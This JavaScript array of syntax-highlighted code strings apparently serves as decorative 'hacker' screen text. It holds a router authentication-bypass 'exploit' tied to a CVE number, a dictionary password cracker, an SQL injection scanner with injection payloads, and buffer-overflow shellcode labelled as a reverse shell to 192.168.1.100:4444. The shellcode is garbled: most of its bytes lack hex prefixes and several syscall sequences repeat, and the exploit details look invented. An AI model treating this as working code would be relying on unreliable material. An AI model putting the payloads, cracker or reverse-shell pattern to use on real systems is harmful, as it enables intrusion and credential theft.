const hackerCode = [
    // Network Vulnerability Scanner
    `<span class="comment">#!/usr/bin/python3</span>
<span class="comment"># CVE-2023-7842 Exploit - Enterprise Router Backdoor</span>
<span class="keyword">import</span> <span class="variable">socket</span>
<span class="keyword">import</span> <span class="variable">struct</span>
<span class="keyword">import</span> <span class="variable">sys</span>
<span class="keyword">from</span> <span class="variable">ctypes</span> <span class="keyword">import</span> <span class="variable">c_uint32</span>

<span class="keyword">def</span> <span class="function">rotate_bits</span>(<span class="variable">val</span>, <span class="variable">r_bits</span>, <span class="variable">max_bits</span>=<span class="number">32</span>):
    <span class="keyword">return</span> ((<span class="variable">val</span> &lt;&lt; <span class="variable">r_bits</span>) % (<span class="number">1</span> &lt;&lt; <span class="variable">max_bits</span>)) | (<span class="variable">val</span> >> (<span class="variable">max_bits</span> - <span class="variable">r_bits</span>))

<span class="keyword">def</span> <span class="function">generate_auth_token</span>(<span class="variable">target_ip</span>, <span class="variable">secret_key</span>=<span class="number">0xF7A3B814</span>):
    <span class="variable">ip_parts</span> = [<span class="function">int</span>(<span class="variable">x</span>) <span class="keyword">for</span> <span class="variable">x</span> <span class="keyword">in</span> <span class="variable">target_ip</span>.<span class="function">split</span>(<span class="string">"."</span>)]
    <span class="variable">checksum</span> = <span class="function">c_uint32</span>(<span class="variable">ip_parts</span>[<span class="number">0</span>] ^ <span class="variable">ip_parts</span>[<span class="number">2</span>] ^ <span class="variable">secret_key</span>).<span class="variable">value</span>
    <span class="variable">checksum</span> = <span class="function">rotate_bits</span>(<span class="variable">checksum</span>, <span class="variable">ip_parts</span>[<span class="number">3</span>] % <span class="number">7</span> + <span class="number">3</span>)
    <span class="keyword">return</span> <span class="function">format</span>(<span class="variable">checksum</span> ^ <span class="variable">secret_key</span>, <span class="string">'08x'</span>)

<span class="keyword">def</span> <span class="function">send_exploit_packet</span>(<span class="variable">target</span>, <span class="variable">port</span>=<span class="number">4781</span>):
    <span class="variable">s</span> = <span class="function">socket</span>.<span class="function">socket</span>(<span class="variable">socket</span>.<span class="variable">AF_INET</span>, <span class="variable">socket</span>.<span class="variable">SOCK_STREAM</span>)
    <span class="variable">s</span>.<span class="function">settimeout</span>(<span class="number">5.0</span>)
    <span class="variable">auth_token</span> = <span class="function">generate_auth_token</span>(<span class="variable">target</span>)
    
    <span class="keyword">try</span>:
        <span class="variable">s</span>.<span class="function">connect</span>((<span class="variable">target</span>, <span class="variable">port</span>))
        <span class="function">print</span>(<span class="string">f"[+] Connected to {target}:{port}"</span>)
        
        <span class="comment"># Crafting exploit payload</span>
        <span class="variable">payload</span> = <span class="function">struct</span>.<span class="function">pack</span>(<span class="string">"!I"</span>, <span class="number">0xDEADBEEF</span>) + <span class="string">b"\\x00"</span> * <span class="number">8</span> + <span class="variable">auth_token</span>.<span class="function">encode</span>() + <span class="string">b"\\r\\n"</span>
        <span class="function">print</span>(<span class="string">f"[*] Sending auth token: {auth_token}"</span>)
        <span class="variable">s</span>.<span class="function">sendall</span>(<span class="variable">payload</span>)
        
        <span class="variable">response</span> = <span class="variable">s</span>.<span class="function">recv</span>(<span class="number">1024</span>)
        <span class="keyword">if</span> <span class="string">b"AUTH-OK"</span> <span class="keyword">in</span> <span class="variable">response</span>:
            <span class="function">print</span>(<span class="string">"[+] Authentication bypass successful!"</span>)
            <span class="keyword">return</span> <span class="variable">s</span>
        <span class="keyword">else</span>:
            <span class="function">print</span>(<span class="string">"[-] Authentication failed."</span>)
            <span class="keyword">return</span> <span class="variable">None</span>
            
    <span class="keyword">except</span> <span class="variable">Exception</span> <span class="keyword">as</span> <span class="variable">e</span>:
        <span class="function">print</span>(<span class="string">f"[-] Exploit failed: {str(e)}"</span>)
        <span class="keyword">return</span> <span class="variable">None</span>`,

    // Password Cracking Tool
    `<span class="comment">// Advanced Password Cracking Module</span>
<span class="keyword">const</span> <span class="variable">crypto</span> = <span class="function">require</span>(<span class="string">'crypto'</span>);
<span class="keyword">const</span> <span class="variable">fs</span> = <span class="function">require</span>(<span class="string">'fs'</span>);
<span class="keyword">const</span> <span class="variable">cluster</span> = <span class="function">require</span>(<span class="string">'cluster'</span>);
<span class="keyword">const</span> <span class="variable">numCPUs</span> = <span class="function">require</span>(<span class="string">'os'</span>).<span class="function">cpus</span>().<span class="variable">length</span>;

<span class="keyword">class</span> <span class="function">HashCracker</span> {
    <span class="function">constructor</span>(<span class="variable">hashType</span> = <span class="string">'sha256'</span>, <span class="variable">options</span> = {}) {
        <span class="variable">this</span>.<span class="variable">hashType</span> = <span class="variable">hashType</span>;
        <span class="variable">this</span>.<span class="variable">saltLength</span> = <span class="variable">options</span>.<span class="variable">saltLength</span> || <span class="number">8</span>;
        <span class="variable">this</span>.<span class="variable">iterations</span> = <span class="variable">options</span>.<span class="variable">iterations</span> || <span class="number">10000</span>;
        <span class="variable">this</span>.<span class="variable">charset</span> = <span class="string">' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:",./<>?'</span>;
        <span class="variable">this</span>.<span class="variable">wordlist</span> = <span class="variable">options</span>.<span class="variable">wordlist</span> || <span class="string">'./wordlists/rockyou.txt'</span>;
    }

    <span class="function">async</span> <span class="function">crackHash</span>(<span class="variable">hash</span>, <span class="variable">salt</span> = <span class="string">''</span>) {
        <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[*] Starting \${this.hashType} cracker...\`</span>);
        <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[*] Target hash: \${hash}\`</span>);
        
        <span class="keyword">if</span> (<span class="variable">cluster</span>.<span class="function">isMaster</span>) {
            <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[+] Master process \${process.pid} is running\`</span>);
            <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[+] Spawning \${numCPUs} worker processes\`</span>);

            <span class="keyword">for</span> (<span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>; <span class="variable">i</span> < <span class="variable">numCPUs</span>; <span class="variable">i</span>++) {
                <span class="variable">cluster</span>.<span class="function">fork</span>();
            }

            <span class="variable">cluster</span>.<span class="variable">on</span>(<span class="string">'exit'</span>, (<span class="variable">worker</span>, <span class="variable">code</span>) => {
                <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[!] Worker\${worker.process.pid} died with code \${code}\`</span>);
            });
            
            <span class="keyword">return</span> <span class="keyword">new</span> <span class="function">Promise</span>(<span class="variable">resolve</span> => {
                <span class="variable">cluster</span>.<span class="variable">on</span>(<span class="string">'message'</span>, (<span class="variable">worker</span>, <span class="variable">message</span>) => {
                    <span class="keyword">if</span> (<span class="variable">message</span>.<span class="variable">found</span>) {
                        <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[+] Password found: \${message.password}\`</span>);
                        <span class="function">resolve</span>(<span class="variable">message</span>.<span class="variable">password</span>);
                        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="variable">id</span> <span class="keyword">in</span> <span class="variable">cluster</span>.<span class="variable">workers</span>) {
                            <span class="variable">cluster</span>.<span class="variable">workers</span>[<span class="variable">id</span>].<span class="function">kill</span>();
                        }
                    }
                });
            });
        } <span class="keyword">else</span> {
            <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[+] Worker \${process.pid} started\`</span>);
            <span class="keyword">await</span> <span class="variable">this</span>.<span class="function">_dictionaryAttack</span>(<span class="variable">hash</span>, <span class="variable">salt</span>);
        }
    }

    <span class="function">async</span> <span class="function">_dictionaryAttack</span>(<span class="variable">hash</span>, <span class="variable">salt</span>) {
        <span class="keyword">try</span> {
            <span class="keyword">const</span> <span class="variable">wordlist</span> = <span class="function">fs</span>.<span class="function">readFileSync</span>(<span class="variable">this</span>.<span class="variable">wordlist</span>, <span class="string">'utf8'</span>).<span class="function">split</span>(<span class="string">'\\n'</span>);
            <span class="keyword">let</span> <span class="variable">count</span> = <span class="number">0</span>;
            
            <span class="keyword">for</span> (<span class="keyword">const</span> <span class="variable">word</span> <span class="keyword">of</span> <span class="variable">wordlist</span>) {
                <span class="variable">count</span>++;
                <span class="keyword">if</span> (<span class="variable">count</span> % <span class="number">10000</span> === <span class="number">0</span>) {
                    <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[*] Worker \${process.pid} tried \${count} passwords...\`</span>);
                }

                <span class="keyword">const</span> <span class="variable">hashedWord</span> = <span class="variable">this</span>.<span class="function">_hashPassword</span>(<span class="variable">word</span>, <span class="variable">salt</span>);
                <span class="keyword">if</span> (<span class="variable">hashedWord</span> === <span class="variable">hash</span>) {
                    <span class="variable">process</span>.<span class="function">send</span>({ <span class="variable">found</span>: <span class="keyword">true</span>, <span class="variable">password</span>: <span class="variable">word</span> });
                    <span class="keyword">return</span> <span class="variable">word</span>;
                }
            }
            <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[-] Worker \${process.pid}: No match found in wordlist\`</span>);
        } <span class="keyword">catch</span> (<span class="variable">error</span>) {
            <span class="function">console</span>.<span class="function">error</span>(<span class="string">\`[-] Error during dictionary attack: \${error.message}\`</span>);
        }
    }

    <span class="function">_hashPassword</span>(<span class="variable">password</span>, <span class="variable">salt</span>) {
        <span class="keyword">return</span> <span class="variable">crypto</span>.<span class="function">pbkdf2Sync</span>(<span class="variable">password</span>, <span class="variable">salt</span>, <span class="variable">this</span>.<span class="variable">iterations</span>, <span class="number">64</span>, <span class="variable">this</span>.<span class="variable">hashType</span>).<span class="function">toString</span>(<span class="string">'hex'</span>);
    }
}`,

    // SQL Injection Attack
    `<span class="comment">#!/usr/bin/env python3</span>
<span class="comment"># SQLmap-style SQL injection scanner</span>

<span class="keyword">import</span> <span class="variable">requests</span>
<span class="keyword">import</span> <span class="variable">re</span>
<span class="keyword">import</span> <span class="variable">time</span>
<span class="keyword">import</span> <span class="variable">sys</span>
<span class="keyword">from</span> <span class="variable">urllib.parse</span> <span class="keyword">import</span> <span class="variable">urljoin</span>, <span class="variable">urlparse</span>, <span class="variable">parse_qsl</span>, <span class="variable">urlencode</span>
<span class="keyword">from</span> <span class="variable">concurrent.futures</span> <span class="keyword">import</span> <span class="variable">ThreadPoolExecutor</span>

<span class="keyword">class</span> <span class="function">SQLInjector</span>:
    <span class="keyword">def</span> <span class="function">__init__</span>(<span class="variable">self</span>, <span class="variable">target_url</span>, <span class="variable">cookies</span>=<span class="variable">None</span>, <span class="variable">headers</span>=<span class="variable">None</span>):
        <span class="variable">self</span>.<span class="variable">target_url</span> = <span class="variable">target_url</span>
        <span class="variable">self</span>.<span class="variable">cookies</span> = <span class="variable">cookies</span> <span class="keyword">or</span> {}
        <span class="variable">self</span>.<span class="variable">headers</span> = <span class="variable">headers</span> <span class="keyword">or</span> {
            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 SQLi Scanner'</span>
        }
        <span class="variable">self</span>.<span class="variable">vulnerable_params</span> = []
        <span class="variable">self</span>.<span class="variable">injection_payloads</span> = [
            <span class="string">"' OR '1'='1"</span>,
            <span class="string">" OR 1=1--"</span>,
            <span class="string">" UNION SELECT NULL,NULL,NULL--"</span>,
            <span class="string">"admin'--"</span>,
            <span class="string">"' OR '1'='1' --"</span>,
            <span class="string">"' OR '1'='1' #"</span>,
            <span class="string">"\\" OR 1=1--"</span>,
            <span class="string">"1'; WAITFOR DELAY '0:0:5'--"</span>,  <span class="comment"># Time-based SQL injection</span>
            <span class="string">"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"</span> <span class="comment"># MySQL time-based</span>
        ]
        <span class="variable">self</span>.<span class="variable">error_patterns</span> = [
            <span class="string">"SQL syntax error"</span>,
            <span class="string">"mysql_fetch_array()"</span>,
            <span class="string">"ORA-"</span>,
            <span class="string">"Microsoft SQL Server"</span>,
            <span class="string">"PostgreSQL"</span>,
            <span class="string">"syntax error"</span>,
            <span class="string">"unclosed quotation mark"</span>
        ]
        <span class="function">print</span>(<span class="string">f"[*] Initialized SQL injection scanner for {self.target_url}"</span>)
        
    <span class="keyword">def</span> <span class="function">extract_parameters</span>(<span class="variable">self</span>):
        <span class="variable">parsed_url</span> = <span class="function">urlparse</span>(<span class="variable">self</span>.<span class="variable">target_url</span>)
        <span class="variable">params</span> = <span class="function">dict</span>(<span class="function">parse_qsl</span>(<span class="variable">parsed_url</span>.<span class="variable">query</span>))
        <span class="keyword">return</span> <span class="variable">params</span>
    
    <span class="keyword">def</span> <span class="function">test_parameter</span>(<span class="variable">self</span>, <span class="variable">param_name</span>, <span class="variable">payload</span>):
        <span class="variable">params</span> = <span class="variable">self</span>.<span class="function">extract_parameters</span>()
        <span class="variable">original_value</span> = <span class="variable">params</span>.<span class="function">get</span>(<span class="variable">param_name</span>, <span class="string">''</span>)
        <span class="variable">params</span>[<span class="variable">param_name</span>] = <span class="variable">payload</span>
        
        <span class="variable">parsed_url</span> = <span class="function">urlparse</span>(<span class="variable">self</span>.<span class="variable">target_url</span>)
        <span class="variable">base_url</span> = <span class="function">urljoin</span>(<span class="variable">self</span>.<span class="variable">target_url</span>, <span class="variable">parsed_url</span>.<span class="variable">path</span>)
        <span class="variable">injected_url</span> = <span class="variable">base_url</span> + <span class="string">"?"</span> + <span class="function">urlencode</span>(<span class="variable">params</span>)
        
        <span class="function">print</span>(<span class="string">f"[*] Testing: {param_name} with payload: {payload}"</span>)
        
        <span class="keyword">try</span>:
            <span class="variable">start_time</span> = <span class="function">time</span>.<span class="function">time</span>()
            <span class="variable">response</span> = <span class="function">requests</span>.<span class="function">get</span>(<span class="variable">injected_url</span>, <span class="variable">headers</span>=<span class="variable">self</span>.<span class="variable">headers</span>, <span class="variable">cookies</span>=<span class="variable">self</span>.<span class="variable">cookies</span>, <span class="variable">timeout</span>=<span class="number">10</span>)
            <span class="variable">elapsed_time</span> = <span class="function">time</span>.<span class="function">time</span>() - <span class="variable">start_time</span>
            
            <span class="comment"># Check for time-based vulnerabilities</span>
            <span class="keyword">if</span> <span class="string">"WAITFOR DELAY"</span> <span class="keyword">in</span> <span class="variable">payload</span> <span class="keyword">or</span> <span class="string">"SLEEP"</span> <span class="keyword">in</span> <span class="variable">payload</span>:
                <span class="keyword">if</span> <span class="variable">elapsed_time</span> >= <span class="number">5</span>:
                    <span class="function">print</span>(<span class="string">f"[+] Time-based SQL injection found in parameter: {param_name}"</span>)
                    <span class="keyword">return</span> <span class="keyword">True</span>
            
            <span class="comment"># Check for error-based or union-based vulnerabilities</span>
            <span class="keyword">for</span> <span class="variable">pattern</span> <span class="keyword">in</span> <span class="variable">self</span>.<span class="variable">error_patterns</span>:
                <span class="keyword">if</span> <span class="variable">pattern</span> <span class="keyword">in</span> <span class="variable">response</span>.<span class="variable">text</span>:
                    <span class="function">print</span>(<span class="string">f"[+] SQL error detected with payload: {payload}"</span>)
                    <span class="function">print</span>(<span class="string">f"[+] Parameter {param_name} is vulnerable!"</span>)
                    <span class="keyword">return</span> <span class="keyword">True</span>
                    
        <span class="keyword">except</span> <span class="variable">Exception</span> <span class="keyword">as</span> <span class="variable">e</span>:
            <span class="function">print</span>(<span class="string">f"[-] Error testing parameter {param_name}: {str(e)}"</span>)
            
        <span class="keyword">return</span> <span class="keyword">False</span>
        
    <span class="keyword">def</span> <span class="function">scan</span>(<span class="variable">self</span>):
        <span class="function">print</span>(<span class="string">"\n[+] Starting SQL Injection scan..."</span>)
        <span class="variable">params</span> = <span class="variable">self</span>.<span class="function">extract_parameters</span>()
        
        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable">params</span>:
            <span class="function">print</span>(<span class="string">"[-] No GET parameters found in the URL."</span>)
            <span class="keyword">return</span>
            
        <span class="function">print</span>(<span class="string">f"[*] Found {len(params)} parameters to test: {', '.join(params.keys())}"</span>)
        
        <span class="keyword">with</span> <span class="function">ThreadPoolExecutor</span>(<span class="variable">max_workers</span>=<span class="number">5</span>) <span class="keyword">as</span> <span class="variable">executor</span>:
            <span class="keyword">for</span> <span class="variable">param</span> <span class="keyword">in</span> <span class="variable">params</span>:
                <span class="keyword">for</span> <span class="variable">payload</span> <span class="keyword">in</span> <span class="variable">self</span>.<span class="variable">injection_payloads</span>:
                    <span class="variable">future</span> = <span class="variable">executor</span>.<span class="function">submit</span>(<span class="variable">self</span>.<span class="function">test_parameter</span>, <span class="variable">param</span>, <span class="variable">payload</span>)
                    <span class="keyword">if</span> <span class="variable">future</span>.<span class="function">result</span>():
                        <span class="variable">self</span>.<span class="variable">vulnerable_params</span>.<span class="function">append</span>((<span class="variable">param</span>, <span class="variable">payload</span>))
        
        <span class="keyword">if</span> <span class="variable">self</span>.<span class="variable">vulnerable_params</span>:
            <span class="function">print</span>(<span class="string">"\n[+] Scan complete! Vulnerable parameters found:"</span>)
            <span class="keyword">for</span> <span class="variable">param</span>, <span class="variable">payload</span> <span class="keyword">in</span> <span class="variable">self</span>.<span class="variable">vulnerable_params</span>:
                <span class="function">print</span>(<span class="string">f"  - Parameter: {param}, Payload: {payload}"</span>)
        <span class="keyword">else</span>:
            <span class="function">print</span>(<span class="string">"\n[-] Scan complete. No SQL injection vulnerabilities found."</span>)`,

    // Buffer Overflow Exploit 
    `<span class="comment">/* Buffer Overflow Exploit for CVE-2022-34791 */</span>
<span class="keyword">#include</span> <span class="string">&lt;stdio.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;stdlib.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;string.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;unistd.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;sys/socket.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;netinet/in.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;arpa/inet.h&gt;</span>

<span class="comment">/* Shellcode - reverse shell to 192.168.1.100:4444 */</span>
<span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="variable">shellcode</span>[] = {
    <span class="comment">/* Push sock = socket(AF_INET, SOCK_STREAM, 0) */</span>
    <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xdb</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>,
    <span class="number">0x66</span>, <span class="number">0xb8</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0xb3</span>, <span class="number">0x02</span>, <span class="number">0xb1</span>, <span class="number">0x01</span>,
    <span class="number">0xcd</span>, <span class="number">0x80</span>, <span class="comment">/* Pop sock to ebx */</span>
    <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="comment">/* Push sockaddr_in struct */</span>
    <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x5c</span>,
    <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x11</span>, <span class="number">5c</span>, <span class="number">66</span>, <span class="number">6a</span>, <span class="number">02</span>, <span class="number">89</span>,
    <span class="number">0xe1</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>, <span class="comment">/* Pop sockaddr_in to ecx */</span>
    <span class="number">89</span>, <span class="number">c1</span>, <span class="comment">/* Connect(sock, sockaddr_in, 16) */</span>
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>,
    <span class="comment">/* Dup2(sock, 0, 1, 2) */</span>
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>,
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>,
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>,
    <span class="comment">/* Execve("/bin/sh", NULL, NULL) */</span>
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">68</span>, <span class="number">2f</span>, <span class="number">2f</span>, <span class="number">73</span>, <span class="number">68</span>,
    <span class="number">2f</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">6e</span>, <span class="number">89</span>, <span class="number">e3</span>, <span class="number">50</span>, <span class="number">89</span>,
    <span class="number">e2</span>, <span class="number">53</span>, <span class="number">89</span>, <span class="number">e1</span>, <span class="number">b0</span>, <span class="number">0b</span>, <span class="number">cd</span>,
    <span class="number">80</span>
};
`
];